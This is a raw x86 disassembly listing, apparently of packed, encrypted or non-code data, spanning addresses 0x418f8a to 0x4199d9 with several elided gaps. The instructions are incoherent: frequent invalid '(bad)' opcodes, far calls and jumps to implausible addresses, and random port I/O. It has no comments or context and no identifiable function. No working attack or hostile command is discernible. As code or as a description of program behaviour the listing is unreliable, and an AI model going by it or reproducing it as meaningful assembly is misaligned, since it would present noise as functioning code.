  418f8a:	(bad)  [ecx-0x571ed042]
  418f90:	stos   BYTE PTR es:[edi],al
  418f91:	push   ebx
  418f92:	retf   0xaeb1
  418f95:	das    
  418f96:	test   eax,0xba5362a8
  418f9b:	mov    cl,0x71
  418f9d:	aas    
  418f9e:	mov    al,0x51
  418fa0:	xor    eax,0xf7bed259
  418fa5:	add    edi,DWORD PTR [esi]
  418fa7:	test   DWORD PTR [ebx-0x16c3567d],edx
  418fad:	add    ecx,DWORD PTR ds:0x964d1d4d
  418fb3:	imul   esp,DWORD PTR [edi+0x4fb180b7],0x61
  418fba:	jp     0x418f6d
  418fbc:	out    0xf0,eax
  418fbe:	push   ebp
  418fbf:	sub    DWORD PTR [ebx+esi*2-0x4c537943],0xffffff8a
  418fc7:	push   ebx
  418fc8:	push   ebx
  418fc9:	mov    esi,DWORD PTR [esi+0x5770ab]
	...
  418feb:	add    BYTE PTR [ebp-0x79],dl
  418fee:	xchg   esp,eax
  418fef:	mov    bh,0x35
  418ff1:	or     esp,DWORD PTR [ebp+esi*4+0x40]
  418ff5:	sbb    ah,al
  418ff7:	push   esi
  418ff8:	jge    0x419026
  418ffa:	xlat   BYTE PTR ds:[ebx]
  418ffb:	xchg   dh,cl
  418ffd:	outs   dx,DWORD PTR ds:[esi]
  418ffe:	mov    bh,0x86
  419000:	into   
  419001:	stos   DWORD PTR es:[edi],eax
  419002:	mov    bh,0xab
  419004:	loope  0x418f91
  419006:	call   0x7402210e
  41900b:	adc    al,0x10
  41900d:	sub    eax,DWORD PTR [eax]
  41900f:	cmc    
  419010:	shr    DWORD PTR [esp+esi*8],0x1
  419014:	adc    BYTE PTR ds:[eax],al
  419017:	jmp    0x7135bcdd
  41901c:	xor    esi,DWORD PTR [eax-0x4ec1c518]
  419022:	std    
  419023:	pusha  
  419024:	cmp    ebp,DWORD PTR [edi+eax*4+0x5b789924]
  41902b:	mov    ebp,0xb4c47c8b
  419030:	xor    DWORD PTR [edx-0x53fca3b0],0x8c079150
  41903a:	(bad)  
  41903b:	call   0xf6b65072
  419040:	popa   
  419041:	sub    al,0xfc
  419043:	mov    ?,ebx
  419045:	stos   DWORD PTR es:[edi],eax
  419046:	call   0x418f12
  41904b:	jge    0x419030
  41904d:	stos   DWORD PTR es:[edi],eax
  41904e:	xchg   DWORD PTR [eax+eax*1],ebp
	...
  41906d:	add    BYTE PTR [ebp+0xe1820a7],dh
  419073:	add    BYTE PTR [edi+0x5b78aac4],al
  419079:	popa   
  41907a:	xchg   DWORD PTR [esp+edi*8+0x56],edx
  41907e:	cmp    ebp,DWORD PTR [eax+ebp*8-0x24f4022]
  419085:	sar    edi,cl
  419087:	test   BYTE PTR [ebx+0x1d],bh
  41908a:	mov    dh,0xa7
  41908c:	sbb    al,0x1e
  41908e:	push   cs
  41908f:	add    BYTE PTR [ecx-0x37099564],cl
  419095:	popa   
  419096:	xor    DWORD PTR [edx],ebp
  419098:	inc    eax
  419099:	jmp    0xd109cca7
  41909e:	ret    
  41909f:	scas   eax,DWORD PTR es:[edi]
  4190a0:	dec    edi
  4190a1:	fsubrp st(3),st
  4190a3:	cmp    al,0xf0
  4190a5:	add    BYTE PTR [ebx+ebp*2-0x4f],dh
  4190a9:	cmp    al,0x12
  4190ab:	ins    BYTE PTR es:[edi],dx
  4190ac:	sti    
  4190ad:	mov    edi,DWORD PTR [ebx]
  4190af:	push   ebx
  4190b0:	mov    DWORD PTR [ebp+0xc],eax
  4190b3:	push   eax
  4190b4:	push   eax
  4190b5:	call   0x3e900e
  4190ba:	addr16 mov eax,0x7449ff18
  4190c0:	xchg   eax,esi
  4190c2:	int3   
  4190c3:	ret    0x150
  4190c6:	in     al,0x72
  4190c8:	jno    0x4190b6
  4190ca:	mov    esp,0xb40150ba
  4190cf:	push   0xffffffde
  4190d1:	sbb    eax,DWORD PTR [eax]
	...
  4190ef:	add    BYTE PTR [edx+0x6b],bh
  4190f2:	(bad)  
  4190f3:	and    ebx,DWORD PTR [ecx]
  4190f5:	mov    WORD PTR [edx+0x3a5ee],?
  4190fb:	mov    edi,DWORD PTR [edx-0x7f]
  4190fe:	mov    eax,eax
  419100:	xchg   ecx,eax
  419101:	jae    0x4190fe
  419103:	mov    BYTE PTR [ebp-0x718ab5bc],ch
  419109:	push   ebx
  41910a:	pop    esi
  41910b:	pop    ebx
  41910c:	lods   eax,DWORD PTR ds:[esi]
  41910d:	(bad)  
  41910e:	push   ecx
  41910f:	mov    eax,DWORD PTR [eax]
  419111:	xchg   esp,esp
  419113:	clc    
  419114:	in     eax,0x5f
  419116:	pushf  
  419117:	add    BYTE PTR [ebx+eax*1+0x4f],ah
  41911b:	mov    ebx,DWORD PTR ds:0x9a044f2f
  419121:	dec    edx
  419122:	adc    edx,0x75fb0898
  419128:	xor    al,0x2e
  41912a:	dec    ecx
  41912b:	or     BYTE PTR [ebx],al
  41912d:	jmp    0x3b6afb3d
  419132:	call   0x45832d
  419137:	test   ah,ah
  419139:	out    0x77,eax
  41913b:	push   0xd
  41913d:	test   eax,0xb4e97c80
  419142:	dec    ecx
  419143:	call   0x45a0d9
  419148:	adc    ch,BYTE PTR [edx]
  41914a:	stc    
  41914b:	mov    al,BYTE PTR [ecx+0x7efd0dbd]
  419151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419152:	cdq    
  419153:	jb     0x419155
	...
  419171:	add    BYTE PTR [ecx-0x3576fe69],dl
  419177:	das    
  419178:	test   DWORD PTR [ecx+eax*4],esp
  41917b:	cwde   
  41917c:	add    DWORD PTR [eax],eax
  41917e:	cmc    
  41917f:	push   ds
  419180:	scas   eax,DWORD PTR es:[edi]
  419181:	std    
  419182:	fidiv  DWORD PTR [ecx]
  419184:	mov    cl,0x83
  419186:	fcomi  st,st(4)
  419188:	pop    ss
  419189:	push   esi
  41918a:	xchg   esi,eax
  41918b:	pop    ebp
  41918c:	push   ecx
  41918d:	mov    ecx,DWORD PTR [ecx+0x5]
  419190:	in     al,0x4f
  419192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419193:	test   eax,0xf6b2ff88
  419198:	fwait
  419199:	xor    edi,DWORD PTR ds:0x498b0198
  41919f:	lds    ecx,FWORD PTR [ecx]
  4191a1:	push   eax
  4191a2:	call   0xb29d:0x18fd11ab
  4191a9:	jae    0x4191c0
  4191ab:	ss or  BYTE PTR ss:[ebp-0x23],dh
  4191b0:	add    edi,edi
  4191b2:	jp     0x4191d0
  4191b4:	shl    DWORD PTR [ebx+eax*1+0x1a],0x6d
  4191b9:	and    al,0xad
  4191bb:	cwde   
  4191bc:	add    DWORD PTR [eax],eax
  4191be:	pop    ds
  4191bf:	xlat   BYTE PTR ds:[ebx]
  4191c0:	add    eax,0x3520cb1
  4191c5:	xor    dh,BYTE PTR [esi]
  4191c7:	sbb    esi,DWORD PTR ds:0x5d412524
  4191cd:	test   BYTE PTR [ecx+ebx*4],cl
  4191d0:	jnp    0x419193
  4191d2:	(bad)  
  4191d4:	les    ecx,FWORD PTR [esi+0x0]
	...
  4191f3:	add    BYTE PTR [esp+eiz*4+0x19c5bc],al
  4191fa:	jg     0x41919d
  4191fc:	and    ch,BYTE PTR [esi-0x5e9ae419]
  419202:	stos   BYTE PTR es:[edi],al
  419203:	add    edi,DWORD PTR [ebx+0x233fd4ae]
  419209:	inc    eax
  41920a:	out    0x86,eax
  41920c:	leave  
  41920d:	cld    
  41920e:	xchg   esp,eax
  41920f:	fwait
  419210:	iret   
  419211:	add    ah,bh
  419213:	add    eax,DWORD PTR [esi+eax*8-0x636ba856]
  41921a:	push   0xffffffa0
  41921c:	xor    eax,0xeb713651
  419221:	jmp    esi
  419223:	add    edi,DWORD PTR [eax]
  419225:	sbb    ah,bh
  419227:	pop    ecx
  419228:	enter  0x1713,0x1a
  41922c:	dec    ebp
  41922d:	add    BYTE PTR [edx-0x38],ch
  419230:	or     DWORD PTR [ebx+0x2d],edi
  419233:	or     BYTE PTR [ebp+0x77],bl
  419236:	fstp   QWORD PTR [ebx+0x3e867a7]
  41923c:	xchg   esp,eax
  41923d:	inc    ebx
  41923e:	fistp  QWORD PTR [edx+0x53]
  419241:	sub    al,0x74
  419243:	mov    cl,BYTE PTR [ebp-0x22fc1900]
  419249:	xchg   edi,eax
  41924a:	pop    ds
  41924b:	push   eax
  41924c:	or     eax,0xe7040100
  419251:	xlat   BYTE PTR ds:[ebx]
  419252:	jae    0x41929b
  419254:	push   ebp
  419255:	push   eax
  419256:	dec    edi
  419257:	push   cs
	...
  419274:	add    BYTE PTR [eax],al
  419276:	inc    ebp
  419277:	add    bh,ah
  419279:	sbb    eax,0xcb9c7b35
  41927e:	xchg   BYTE PTR [esi+0xd0457],al
  419284:	cwde   
  419285:	fwait
  419286:	ret    
  419287:	int    0x0
  419289:	ss jl  0x4192f7
  41928c:	std    
  41928d:	adc    DWORD PTR cs:[eax],eax
  419290:	push   0xffffffe8
  419292:	mov    cl,0xc2
  419294:	call   0x41d6ce
  419299:	out    0xa5,al
  41929b:	(bad)  
  41929c:	push   0xffffffe8
  41929e:	cdq    
  41929f:	ret    0xabf
  4192a2:	stc    
  4192a3:	xchg   edi,eax
  4192a4:	ret    
  4192a5:	push   ss
  4192a6:	adc    DWORD PTR [eax],eax
  4192a8:	or     eax,0xc0f6c93e
  4192ad:	pusha  
  4192ae:	xchg   DWORD PTR [ebp+0x1a0ee8ff],esp
  4192b4:	push   DWORD PTR [ecx-0x2b]
  4192b7:	xchg   edi,eax
  4192b8:	scas   eax,DWORD PTR es:[edi]
  4192b9:	mov    esi,0x960d000e
  4192be:	(bad)  
  4192bf:	sbb    edi,edi
  4192c1:	jno    0x419288
  4192c3:	ins    BYTE PTR es:[edi],dx
  4192c4:	loope  0x41929f
  4192c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192c7:	popa   
  4192c8:	aad    0xe9
  4192ca:	push   cs
  4192cb:	sti    
  4192cc:	mov    ah,0xa9
  4192ce:	mov    ecx,0x84705dbf
  4192d3:	cdq    
  4192d4:	(bad)  
  4192d5:	call   0x330809e8
	...
  4192f6:	add    BYTE PTR [eax],al
  4192f8:	rol    WORD PTR [ecx+ebp*8],0x43
  4192fd:	ja     0x4192eb
  4192ff:	sbb    BYTE PTR [ebx+ebp*2],dh
  419302:	out    dx,al
  419303:	call   0x3969316
  419308:	or     DWORD PTR [edi-0x3],ecx
  41930b:	aam    0xde
  41930d:	adc    eax,0xc389e940
  419312:	or     al,0x6c
  419314:	aam    0x3b
  419316:	push   eax
  419317:	ret    
  419318:	jb     0x41929f
  41931a:	cmp    DWORD PTR [esi+0x436db],ebp
  419320:	fbstp  TBYTE PTR [edi+0x163bfe8]
  419326:	add    BYTE PTR [ebx+0xc4b2],cl
  41932c:	and    al,0x2b
  41932e:	cmp    DWORD PTR [edx+esi*1+0x40],ecx
  419332:	add    BYTE PTR [ecx+0x1069dc77],cl
  419338:	test   eax,0x2400c876
  41933d:	add    BYTE PTR [eax-0x73],dl
  419340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419341:	add    BYTE PTR [eax],0x0
  419344:	hlt    
  419345:	dec    edi
  419346:	sti    
  419347:	xlat   BYTE PTR ds:[ebx]
  419348:	mov    WORD PTR ds:0x2ae4fffd,es
  41934e:	xchg   al,bl
  419350:	in     al,0xff
  419352:	dec    DWORD PTR [edi+0x79]
  419355:	jg     0x4192e7
  419357:	add    ah,dh
  419359:	dec    DWORD PTR [edi-0x1]
	...
  419378:	add    BYTE PTR [eax],al
  41937a:	mov    ds:0xcb18c47f,eax
  41937f:	xor    ch,ah
  419381:	add    esi,DWORD PTR [edi+edi*8-0x2f7978]
  419388:	(bad)  
  419389:	call   DWORD PTR [ecx+eax*4]
  41938c:	xchg   ah,bl
  41938e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41938f:	(bad)  
  419390:	dec    DWORD PTR [edi+0x1f]
  419393:	push   edi
  419394:	call   0x414979
  419399:	inc    BYTE PTR [edx-0x54]
  41939c:	add    eax,DWORD PTR [eax]
  41939e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41939f:	add    BYTE PTR [esi-0x8e00],0x4f
  4193a6:	jmp    0x64458c2c
  4193ab:	dec    DWORD PTR [edi-0x18]
  4193ae:	sbb    bh,dh
  4193b0:	(bad)  
  4193b1:	(bad)  
  4193b2:	stc    
  4193b3:	adc    DWORD PTR [esi+eax*1],0x5001990d
  4193ba:	xchg   dh,dl
  4193bc:	fwait
  4193bd:	test   DWORD PTR [edi],ecx
  4193bf:	cdq    
  4193c0:	add    DWORD PTR [ebp+0x3ea4a],edi
  4193c6:	mov    bh,0x97
  4193c8:	jp     0x41938f
  4193ca:	and    eax,0xd00d5fd
  4193cf:	mov    dl,0x76
  4193d1:	ror    BYTE PTR [ecx+edi*8+0x13],0x87
  4193d6:	enter  0x1a14,0xff
  4193da:	xchg   edx,esp
  4193dc:	fwait
  4193dd:	retf   0x0
	...
  4193fc:	cmp    ebx,DWORD PTR [ecx-0x273df2ff]
  419402:	clc    
  419403:	inc    edx
  419404:	add    DWORD PTR [edx-0x680c7e84],edx
  41940a:	add    DWORD PTR [eax],eax
  41940c:	xchg   BYTE PTR [edx],bl
  41940e:	or     eax,0x7c990d08
  419413:	xor    edi,0x86000197
  419419:	push   ebp
  41941a:	mov    esp,0x1d2e38c1
  41941f:	and    al,0x15
  419421:	adc    edx,DWORD PTR [ebp-0x75]
  419424:	dec    eax
  419425:	popf   
  419426:	push   ecx
  419427:	push   0xfffffff9
  419429:	stc    
  41942a:	jle    0x419475
  41942c:	inc    ecx
  41942d:	cs (bad) 
  41942f:	call   0x4646ee
  419434:	xchg   esi,eax
  419435:	fld    TBYTE PTR [edi]
  419437:	mov    eax,ebx
  419439:	or     al,0x16
  41943b:	inc    eax
  41943c:	or     eax,0xdc48230
  419441:	cdq    
  419442:	add    DWORD PTR [edx+0x1d],ebp
  419445:	and    al,0x88
  419447:	or     BYTE PTR ds:0x80500199,0xff
  41944e:	imul   edi,DWORD PTR [ebx+0x53e7000d],0x1bfd260
  419458:	pop    edx
  419459:	stos   BYTE PTR es:[edi],al
  41945a:	out    0x80,eax
  41945c:	mov    cs,WORD PTR [edi+0x3e7]
	...
  41947e:	or     eax,0x65826c50
  419483:	jmp    esi
  419485:	add    ebx,ebp
  419487:	stos   BYTE PTR es:[edi],al
  419488:	push   ss
  419489:	or     BYTE PTR [ecx+0x7],0x8f
  41948d:	pop    es
  41948e:	sub    ch,BYTE PTR [edx-0x72717f19]
  419494:	call   0x5c91a19c
  419499:	jb     0x4194cc
  41949b:	add    bh,ah
  41949d:	add    esi,DWORD PTR [edi+0x0]
  4194a0:	push   0xffffffbb
  4194a2:	add    BYTE PTR [ecx-0x56040dcd],bl
  4194a8:	bound  ecx,QWORD PTR [eax+0x3e6ffa3]
  4194ae:	xchg   edx,eax
  4194af:	jge    0x41947c
  4194b1:	add    DWORD PTR ds:0x87fc4100,ecx
  4194b7:	add    DWORD PTR [ebp+0x17000d03],0x7f
  4194be:	mov    WORD PTR [edx+ebp*8-0x49aff2fd],fs
  4194c5:	aad    0x8c
  4194c7:	(bad)  
  4194c8:	fistp  DWORD PTR [ebx]
  4194ca:	or     edi,edi
  4194cc:	out    0x3,al
  4194ce:	xchg   esi,eax
  4194cf:	sbb    DWORD PTR [ecx+0x3],0xd
  4194d3:	add    BYTE PTR [edi],dh
  4194d5:	jg     0x419533
  4194d7:	test   al,0xea
  4194d9:	add    ecx,DWORD PTR ds:0x5580e716
  4194df:	test   eax,0x2d8f
	...
  419500:	cmp    al,0xff
  419502:	(bad)  
  419503:	call   0xe91011fd
  419508:	push   cs
  419509:	add    BYTE PTR [edi+0x3696a],al
  41950f:	jmp    0x6ccc8d18
  419514:	push   ebx
  419515:	test   eax,0x74bee9fd
  41951a:	sub    ecx,0x99000010
  419520:	jno    0x4194f5
  419522:	sub    DWORD PTR ds:0xe804180d,0x6c8b000e
  41952c:	aas    
  41952d:	test   eax,0x74bee9fd
  419532:	mov    cl,0xfd
  419534:	adc    BYTE PTR [eax],al
  419536:	add    BYTE PTR [ebx+0x6c87f0e],al
  41953c:	test   eax,0xee8313d
  419541:	ja     0x4194c6
  419543:	add    ecx,DWORD PTR [esi]
  419545:	add    BYTE PTR [eax],al
  419547:	mov    es,WORD PTR [eax-0x7f]
  41954a:	add    DWORD PTR ds:0x3cfda8e9,0x3c0003cf
  419554:	push   esp
  419555:	pushf  
  419556:	jg     0x419515
  419558:	(bad)  
  419559:	test   eax,0x5c8de9fd
  41955e:	clc    
  41955f:	mov    edi,0xec00aa71
	...
  419580:	add    BYTE PTR [eax],al
  419582:	sahf   
  419583:	(bad)  
  419584:	(bad)  
  419585:	call   0xa1c50ae8
  41958a:	js     0x419536
  41958c:	std    
  41958d:	xchg   ecx,eax
  41958e:	daa    
  41958f:	int3   
  419590:	std    
  419591:	xchg   esi,eax
  419592:	lea    esp,[esp+ecx*1]
  419595:	jmp    0xca8e74
  41959a:	sub    DWORD PTR [eax],eax
  41959c:	xchg   DWORD PTR [ebp+0x7c],ecx
  41959f:	sub    DWORD PTR [ecx-0x4a3fd08],eax
  4195a5:	call   0x3d4fe7
  4195aa:	sbb    eax,0x990008bf
  4195af:	daa    
  4195b0:	in     al,dx
  4195b1:	or     eax,0x54
  4195b4:	jge    0x4195a2
  4195b6:	add    BYTE PTR [edx],0x0
  4195b9:	add    BYTE PTR [ebx+0x6424bc29],ch
  4195bf:	std    
  4195c0:	(bad)  
  4195c1:	dec    esp
  4195c3:	push   0x7f2401b8
  4195c8:	fs and al,0x1c
  4195cb:	cld    
  4195cc:	mov    BYTE PTR [eax+ecx*2+0x24000145],al
  4195d3:	dec    esp
  4195d4:	mov    DWORD PTR [eax+ecx*2-0x58],eax
  4195d8:	in     eax,0x3f
  4195da:	xor    BYTE PTR [ebx+edi*8-0x75],dl
  4195de:	mov    cl,0xab
  4195e0:	mov    bh,0xee
  4195e2:	in     eax,0x3
  4195e4:	add    BYTE PTR [ebp+0x0],cl
	...
  419602:	add    BYTE PTR [eax],al
  419604:	test   al,0x9f
  419606:	add    eax,0xfbb949e8
  41960b:	jmp    DWORD PTR [ebx]
  41960d:	daa    
  41960e:	loope  0x41966d
  419610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419611:	add    BYTE PTR [eax],al
  419613:	mov    esi,eax
  419615:	lahf   
  419616:	add    DWORD PTR [ebx+0x2a],edx
  419619:	sub    DWORD PTR [ebx+0x3b592],esi
  41961f:	call   0x3ea6f0
  419624:	mov    bh,0xb6
  419626:	aaa    
  419627:	ret    
  419628:	lock out 0x4e,eax
  41962b:	push   ebx
  41962c:	dec    BYTE PTR [edi]
  41962e:	push   esi
  41962f:	push   eax
  419630:	or     eax,0xed24308e
  419635:	jmp    0x1162938e
  41963a:	adc    eax,DWORD PTR [eax+0xd]
  41963d:	ret    0x7ec6
  419640:	inc    ebx
  419641:	sbb    al,0xf8
  419643:	das    
  419644:	xor    eax,0x1274a910
  419649:	sbb    ch,BYTE PTR [esp+edx*1+0x177c0fe0]
  419650:	out    0xa0,eax
  419652:	stos   BYTE PTR es:[edi],al
  419653:	je     0x41967e
  419655:	lods   eax,DWORD PTR ds:[esi]
  419656:	js     0x4195dd
  419658:	jae    0x4195f2
  41965a:	add    DWORD PTR [eax],eax
  41965c:	fucom  st(5)
  41965e:	push   cs
  41965f:	dec    esp
  419660:	and    ebx,DWORD PTR [ecx+0x1]
  419663:	mov    ecx,ecx
  419665:	cld    
  419666:	jecxz  0x4195ee
	...
  419684:	add    BYTE PTR [eax],al
  419686:	xchg   edx,eax
  419687:	dec    edi
  419688:	add    eax,DWORD PTR [eax]
  41968a:	or     eax,0x5d0cc01a
  41968f:	cwde   
  419690:	inc    edi
  419691:	pop    ecx
  419692:	dec    edi
  419693:	lds    eax,FWORD PTR [ecx]
  419695:	xor    cl,ch
  419697:	adc    DWORD PTR [ecx-0x242ae77],esi
  41969d:	push   eax
  41969e:	arpl   WORD PTR [ecx+esi*2],bx
  4196a1:	mov    dl,0xc
  4196a3:	cdq    
  4196a4:	add    eax,ebp
  4196a6:	mov    WORD PTR [esp+eax*1-0x113de200],fs
  4196ad:	rcr    BYTE PTR [ecx-0x23],0x54
  4196b1:	push   ecx
  4196b2:	lods   eax,DWORD PTR ds:[si]
  4196b4:	dec    edi
  4196b5:	push   eax
  4196b6:	retf   0xdfe4
  4196b9:	pop    ds
  4196ba:	pop    esi
  4196bb:	or     ch,BYTE PTR [ecx+0x41c82513]
  4196c1:	add    dh,dh
  4196c3:	pop    ecx
  4196c4:	daa    
  4196c5:	ss cwde 
  4196c7:	push   edx
  4196c9:	repz fimul DWORD PTR [eax-0x62]
  4196cd:	das    
  4196ce:	adc    BYTE PTR [ebx-0x26e9f071],al
  4196d4:	pop    esi
  4196d5:	or     al,0xf7
  4196d7:	test   DWORD PTR [ebp+0x6c0c292f],0xe7005382
  4196e1:	add    ebx,ebp
  4196e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196e4:	aam    0x37
  4196e6:	add    eax,DWORD PTR [eax-0x19]
  4196e9:	jle    0x4196eb
	...
  419707:	add    cl,cl
  419709:	fild   DWORD PTR [esi]
  41970b:	jge    0x41969d
  41970d:	mov    ch,0xe8
  41970f:	add    ecx,DWORD PTR ds:0x7af72383
  419715:	add    BYTE PTR [ebp-0x190cb0b2],ah
  41971b:	cmc    
  41971c:	jp     0x4196b8
  41971e:	ds jle 0x4196e2
  419721:	fnclex 
  419723:	push   esi
  419724:	ret    
  419725:	je     0x41977e
  419727:	aad    0x22
  419729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41972a:	out    0x9b,eax
  41972c:	test   DWORD PTR [ebx],0xcadc03e8
  419732:	rol    dh,cl
  419734:	mov    esp,edx
  419736:	cdq    
  419737:	push   esi
  419738:	ja     0x419746
  41973a:	xchg   ebp,eax
  41973b:	push   ebx
  41973c:	clc    
  41973d:	sub    al,0xcb
  41973f:	jecxz  0x41979e
  419741:	push   ecx
  419742:	out    dx,al
  419743:	pcmpeqw mm1,QWORD PTR [edi]
  419746:	daa    
  419747:	add    al,0x24
  419749:	rcr    DWORD PTR [ebp+0x12],0x86
  41974d:	hlt    
  41974e:	push   ss
  41974f:	in     al,dx
  419750:	cmp    esp,DWORD PTR [ebp-0x5773fead]
  419756:	(bad)  [esi]
  419758:	or     bh,BYTE PTR [eax-0x20]
  41975b:	jae    0x419717
  41975d:	inc    ebx
  41975e:	add    BYTE PTR [edx],dl
  419760:	retf   
  419761:	cld    
  419762:	(bad)  
  419763:	cli    
  419764:	into   
  419765:	xchg   edi,eax
  419766:	cmc    
  419767:	cmp    al,0x20
  419769:	xchg   esp,eax
  41976a:	jg     0x4196f9
	...
  419788:	add    BYTE PTR [eax],al
  41978a:	(bad)  
  41978c:	(bad)  
  41978d:	call   0x5c96e5cb
  419792:	cli    
  419793:	pop    edi
  419794:	sti    
  419795:	xchg   BYTE PTR [eax+ebx*4-0x5c5b7d51],dh
  41979c:	std    
  41979d:	cld    
  41979e:	jp     0x419818
  4197a0:	jnp    0x419805
  4197a2:	mov    ah,0x31
  4197a4:	or     BYTE PTR [eax-0x64],ch
  4197a7:	out    dx,eax
  4197a8:	xchg   esi,eax
  4197a9:	clc    
  4197aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197ab:	jge    0x419828
  4197ad:	pop    ebp
  4197ae:	jno    0x419753
  4197b0:	dec    ecx
  4197b1:	call   0x711a86c4
  4197b6:	add    ch,BYTE PTR [eax+0x15fd2a39]
  4197bc:	std    
  4197bd:	mov    esp,0x2789353a
  4197c2:	mov    esi,ebx
  4197c4:	std    
  4197c5:	es je  0x4197e2
  4197c8:	adc    al,0x6c
  4197ca:	call   0x5150:0x6416fd51
  4197d1:	pop    esp
  4197d2:	cmp    ch,BYTE PTR [eax-0x7f]
  4197d5:	xor    DWORD PTR [edi+edx*4+0xfb83f],esi
  4197dc:	sub    DWORD PTR [ecx],0x27
  4197df:	or     DWORD PTR [ecx-0x77e7bed9],ecx
  4197e5:	leave  
  4197e6:	dec    ecx
  4197e7:	add    BYTE PTR [ebx-0x259799c],cl
  4197ed:	(bad)  
	...
  41980a:	add    BYTE PTR [eax],al
  41980c:	ds cwde 
  41980e:	adc    DWORD PTR [esi+ecx*1+0x0],ebx
  419812:	add    DWORD PTR [eax],0x74
  419815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419816:	xchg   edx,eax
  419817:	ror    BYTE PTR [esi],0xbb
  41981a:	jno    0x419825
  41981c:	mov    bh,0xc0
  41981e:	mov    WORD PTR [ecx],si
  419821:	jns    0x41981a
  419823:	jmp    FWORD PTR [ebx+0x2d]
  419826:	sbb    DWORD PTR [eax+0x50fb576f],0x13c3f57b
  419830:	xor    al,0xfc
  419832:	imul   eax,DWORD PTR [edi],0x58dfd5f9
  419838:	pushf  
  419839:	aam    0xcc
  41983b:	add    BYTE PTR [eax+ebp*1+0x59],ah
  41983f:	or     esi,DWORD PTR [ebx+0x7401fbe5]
  419845:	add    BYTE PTR [eax],al
  419847:	jmp    0x419858
  419849:	sbb    esi,ebp
  41984b:	add    DWORD PTR [eax+eax*1-0x77],esp
  41984f:	test   DWORD PTR [ebp+ebx*2-0x7430005],edx
  419856:	aas    
  419857:	dec    ecx
  419858:	adc    DWORD PTR [edx+0x32],0xbdcdc0
  41985f:	add    BYTE PTR [ebx+eiz*1],dh
  419862:	jns    0x419858
  419864:	arpl   WORD PTR [edi+0x71],dx
  419867:	cld    
  419868:	test   eax,0x8e50dfe5
  41986d:	hlt    
  41986e:	push   esi
  41986f:	lea    eax,[eax]
	...
  41988d:	add    BYTE PTR [ecx-0x31d41771],bl
  419893:	(bad)  
  419894:	inc    DWORD PTR [edx-0x77f54d0]
  41989a:	sti    
  41989b:	stos   DWORD PTR es:[edi],eax
  41989c:	sbb    DWORD PTR [esi-0x7500000c],0x85894cb3
  4198a6:	mov    WORD PTR [edi-0x5],ss
  4198a9:	dec    DWORD PTR ds:0x9d8376e9
  4198af:	shl    BYTE PTR [ebp+0x77d15dfd],1
  4198b5:	mov    WORD PTR ds:0x2c08099,cs
  4198bb:	adc    eax,0x990d0084
  4198c0:	repnz fdivr DWORD PTR [esi]
  4198c3:	adc    DWORD PTR [eax+eax*1-0xe866f3],eax
  4198ca:	aas    
  4198cb:	out    0x1b,al
  4198cd:	add    BYTE PTR ds:0x888bc199,cl
  4198d3:	dec    ecx
  4198d4:	stos   DWORD PTR es:[edi],eax
  4198d5:	std    
  4198d6:	jp     0x4198e1
  4198d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198d9:	adc    ecx,ebp
  4198db:	mov    BYTE PTR [ecx+0x0],0x96
  4198df:	sub    DWORD PTR [ecx+0xcc462fe],eax
  4198e5:	std    
  4198e6:	add    BYTE PTR [ebp+0x160d4012],dl
  4198ec:	lods   al,BYTE PTR ds:[esi]
  4198ed:	push   eax
  4198ee:	shr    BYTE PTR [eax-0x5a],0x43
	...
  41990e:	add    BYTE PTR [eax],al
  419910:	inc    ecx
  419911:	sbb    BYTE PTR [edi],ah
  419913:	cld    
  419914:	and    eax,0xbf000196
  419919:	adc    al,0x99
  41991b:	inc    edx
  41991c:	xchg   esi,eax
  41991d:	push   esp
  41991e:	cmc    
  41991f:	push   eax
  419920:	nop
  419921:	push   esp
  419922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419923:	push   eax
  419924:	ret    0x2f01
  419927:	clc    
  419928:	mov    ebx,0x1f4c0f09
  41992d:	pop    ecx
  41992e:	add    DWORD PTR [ebx-0x3a03db33],eax
  419934:	push   eax
  419935:	scas   al,BYTE PTR es:[edi]
  419936:	add    al,0x37
  419938:	jo     0x4198e7
  41993a:	sub    eax,0xfa739501
  41993f:	push   ebp
  419940:	loop   0x419941
  419942:	sti    
  419943:	out    0xfc,eax
  419945:	aas    
  419946:	out    0x4d,eax
  419948:	ror    BYTE PTR [ebx+ebp*8],1
  41994b:	adc    cl,BYTE PTR [ebp+0x0]
  41994e:	cmovns edx,DWORD PTR [ebp*1-0x7071870d]
  419956:	shl    BYTE PTR [esi+0x70bf4fb0],0xbb
  41995d:	mov    ds:0xa81ea6ae,al
  419962:	tzmsk  edi,edi
  419967:	ins    BYTE PTR es:[edi],dx
  419968:	mov    ds:0x9603e700,eax
  41996d:	jl     0x4199b6
  41996f:	test   al,0x80
  419971:	mov    ds:0x3ad,al
	...
  419992:	or     eax,0x7a313040
  419997:	jne    0x4199c5
  419999:	sti    
  41999a:	leave  
  41999b:	inc    ecx
  41999c:	adc    bh,BYTE PTR [ebp+0x50e6f74f]
  4199a2:	test   BYTE PTR [ebx-0x8c26898],dl
  4199a8:	out    0x3,al
  4199aa:	fmul   QWORD PTR [ecx-0x4a]
  4199ad:	js     0x419a2d
  4199af:	mov    eax,DWORD PTR [esi+eiz*4+0x38]
  4199b3:	xchg   edi,eax
  4199b4:	xlat   BYTE PTR ds:[ebx]
  4199b5:	test   eax,0xfc1a230
  4199ba:	les    ecx,FWORD PTR [esi+0x5c]
  4199bd:	or     bl,0xa2
  4199c0:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4199c2:	mov    ebp,0x9e78e715
  4199c7:	push   ebx
  4199c8:	push   0xffffffbb
  4199ca:	or     BYTE PTR [ecx-0x5dfc29e1],bl
  4199d0:	ins    BYTE PTR es:[edi],dx
  4199d1:	ret    
  4199d2:	jnp    0x4199d7
  4199d4:	jb     0x419993
  4199d6:	pop    ebp
  4199d7:	sbb    BYTE PTR [eax],al
  4199d9:	popa   
